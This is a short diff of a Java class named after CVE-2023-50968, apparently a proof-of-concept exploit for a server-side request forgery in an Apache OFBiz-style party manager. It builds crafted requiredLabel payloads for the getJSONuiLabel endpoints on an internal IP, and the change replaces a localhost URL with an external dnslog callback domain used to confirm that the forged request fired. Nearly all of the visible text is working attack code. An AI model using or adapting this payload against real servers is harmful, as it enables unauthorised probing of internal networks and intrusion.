@@ -11,8 +11,8 @@ public class CVE_2023_50968 {
     public static void main(String[] args) throws IOException {
         String url = "http://10.58.120.200:8080/partymgr/control/getJSONuiLabel";
         String url2 = "http://10.58.120.200:8080/partymgr/control/getJSONuiLabelArray";
-        String body = "requiredLabel={\"http://127.0.0.1:8000/foo\":\"anystr\"}";
-        String body2 = "requiredLabels={\"http://127.0.0.1:8000/foo\":[\"anystr\"]}";
+        String body = "requiredLabel={\"tx9o7lf5.dnslog.pw\":\"anystr\"}";
+        String body2 = "requiredLabels={\"http://tx9o7lf5.dnslog.pw\":[\"anystr\"]}";
         HttpRequest httpRequest = new HttpRequest("127.0.0.1", 8080);
         HttpPost httpPost = new HttpPost(url2);
         httpPost.addHeader("Content-Type", "application/x-www-form-urlencoded");
